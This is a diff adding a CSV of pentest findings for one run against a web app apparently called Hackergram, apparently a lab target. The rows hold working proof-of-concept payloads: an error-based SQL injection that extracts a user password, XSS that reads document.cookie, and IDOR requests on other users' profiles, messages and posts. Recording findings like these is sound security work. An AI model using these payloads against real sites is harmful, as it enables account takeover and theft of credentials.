@@ -1,0 +1,15 @@
+run_id,endpoint,vulnerability,poc
+20260904-1931-0001,"`/profile?username`, `/users?search`, `/posts?search`, `/friends?search`",SQL Injection,"`GET /profile?username=mr_robot' AND updatexml(1,concat(0x7e,(SELECT password FROM hackergramdb.Users LIMIT 0,1),0x7e),1)--`"
+20260904-1931-0001,`/users?search`,Reflected XSS,`GET /users?search=<script>alert(document.cookie)</script>`
+20260904-1931-0001,`/friends?username`,Reflected XSS,`GET /friends?username=<script>alert(1)</script>`
+20260904-1931-0001,`/create_post` (POST),Stored XSS,`POST /create_post` — `title=<script>alert(document.cookie)</script>`
+20260904-1931-0001,`/profile?username={any}`,Broken Access Control / IDOR,`GET /profile?username=stark` (as any authenticated user)
+20260904-1931-0001,`/direct_messages?username={any}`,Broken Access Control / IDOR,`GET /direct_messages?username=stark` (as any authenticated user)
+20260904-1931-0001,`/delete_post?id={any}`,Broken Access Control / IDOR,`GET /delete_post?id=1` (as any authenticated user)
+20260904-1931-0001,`/edit_post?id={any}`,Broken Access Control / IDOR,`GET /edit_post?id=1` (as any authenticated user)
+20260904-1931-0001,All pages,Missing Security Headers,"No CSP, X-Frame-Options, or X-Content-Type-Options headers"
+20260904-1931-0001,All POST forms,Missing Anti-CSRF Tokens,"All forms (login, signup, create_post, etc.) lack CSRF tokens"
+20260904-1931-0001,Session cookie,Cookie Security Issues,Missing `SameSite` and `Secure` flags
+20260904-1931-0001,All pages,Information Disclosure,`Server: Werkzeug/3.0.6 Python/3.8.10` header
+20260904-1931-0001,All pages,Debug Error Messages,SQL errors returned with full query details
+20260904-1931-0001,`/settings`,File Upload (unvalidated),POST multipart with arbitrary file upload
